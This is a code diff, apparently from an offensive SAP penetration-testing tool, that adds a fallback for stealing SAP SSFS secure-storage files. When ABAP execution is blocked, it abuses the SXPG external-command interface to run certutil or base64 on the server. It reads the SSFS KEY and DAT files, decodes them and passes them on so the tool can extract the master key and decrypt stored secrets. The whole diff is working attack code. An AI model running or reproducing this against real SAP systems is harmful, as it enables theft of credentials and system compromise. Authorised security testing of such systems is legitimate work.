@@ -439,6 +439,108 @@ def _read_ssfs_files_via_abap(node, creds) -> tuple:
         return None, None
 
 
+def _read_ssfs_files_via_sxpg(node, creds) -> tuple:
+    """Read SSFS KEY and DAT files via SXPG OS commands (no ABAP exec needed).
+
+    Fallback when RFC_ABAP_INSTALL_AND_RUN is blocked by SCC4.  Uses
+    execute_local_command() which creates a loopback TCP/IP destination
+    and calls SXPG_STEP_XPG_START to run base64-encoding OS commands.
+
+    Windows: certutil -encode <file> <tmpfile> && type <tmpfile>
+    Linux:   base64 <file>
+
+    Returns (key_bytes, dat_bytes) — either or both may be None.
+    """
+    import base64
+
+    sid = node.sid
+    is_windows = (node.os_type or "").lower() in ("windows", "win", "nt")
+
+    # Determine instance string for temp file path on Windows
+    inst_str = "D00"
+    for inst in node.instances:
+        if inst.instance_nr and inst.instance_nr != "XX":
+            nr = inst.instance_nr
+            inst_str = f"DVEBMGS{nr}" if int(nr) < 50 else f"D{nr}"
+            break
+
+    # SSFS file paths to try (both /usr/sap/ and /sapmnt/)
+    if is_windows:
+        key_paths = [
+            f"C:\\usr\\sap\\{sid}\\SYS\\global\\security\\rsecssfs\\key\\SSFS_{sid}.KEY",
+        ]
+        dat_paths = [
+            f"C:\\usr\\sap\\{sid}\\SYS\\global\\security\\rsecssfs\\data\\SSFS_{sid}.DAT",
+        ]
+        work_dir = f"C:\\usr\\sap\\{sid}\\{inst_str}\\work"
+    else:
+        key_paths = [
+            f"/usr/sap/{sid}/SYS/global/security/rsecssfs/key/SSFS_{sid}.KEY",
+            f"/sapmnt/{sid}/global/security/rsecssfs/key/SSFS_{sid}.KEY",
+        ]
+        dat_paths = [
+            f"/usr/sap/{sid}/SYS/global/security/rsecssfs/data/SSFS_{sid}.DAT",
+            f"/sapmnt/{sid}/global/security/rsecssfs/data/SSFS_{sid}.DAT",
+        ]
+        work_dir = None  # not needed for Linux
+
+    def _read_file_via_sxpg(file_paths, label):
+        """Read a single file via SXPG, trying multiple paths."""
+        for fpath in file_paths:
+            if is_windows:
+                tmp = f"{work_dir}\\ssfs_tmp.b64"
+                cmd = "cmd"
+                params = f'/c certutil -encode "{fpath}" "{tmp}" && type "{tmp}" && del "{tmp}"'
+            else:
+                # Call base64 directly — do NOT wrap in /bin/sh -c "..."
+                # because SXPG mangles inner quotes
+                cmd = "base64"
+                params = fpath
+
+            result = sapmap_rfc.execute_local_command(node, cmd, params, creds)
+            if not result.get("success") or not result.get("output"):
+                continue
+
+            # Extract base64 from output
+            b64_lines = []
+            for line in result["output"]:
+                clean = line.strip()
+                if clean.startswith("-----"):
+                    continue  # certutil header/footer
+                if "CertUtil" in clean or "Input Length" in clean or "Output Length" in clean:
+                    continue  # certutil status messages
+                b64_chars = "".join(
+                    c for c in clean
+                    if c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
+                )
+                if b64_chars:
+                    b64_lines.append(b64_chars)
+
+            b64_str = "".join(b64_lines)
+            if len(b64_str) < 10:
+                continue
+
+            try:
+                raw = base64.b64decode(b64_str)
+                if len(raw) > 0:
+                    print(f"[+] {node.sid}: SSFS {label} read via SXPG: "
+                          f"{len(raw)} bytes from {fpath}")
+                    return raw
+            except Exception:
+                continue
+
+        return None
+
+    print(f"[*] {node.sid}: Reading SSFS files via SXPG (OS commands)...")
+    key_bytes = _read_file_via_sxpg(key_paths, "KEY")
+    dat_bytes = _read_file_via_sxpg(dat_paths, "DAT")
+
+    if not key_bytes and not dat_bytes:
+        print(f"[-] {node.sid}: SXPG could not read any SSFS files")
+
+    return key_bytes, dat_bytes
+
+
 # ---------------------------------------------------------------------------
 # Public decrypt function
 # ---------------------------------------------------------------------------
@@ -707,6 +809,10 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
     # Detect "not permitted" error — SSFS read uses ABAP exec
     if key_bytes is None and dat_bytes is None:
         abap_blocked = True  # might be blocked, will confirm in step 2
+        # --- Step 1b: SXPG fallback for SSFS files ---
+        # SXPG doesn't need ABAP exec — it runs OS commands via sapxpg
+        print(f"[*] {node.sid}: ABAP exec failed for SSFS, trying SXPG fallback...")
+        key_bytes, dat_bytes = _read_ssfs_files_via_sxpg(node, creds)
 
     # Extract SSFS master key from KEY file (if available)
     ssfs_key = None
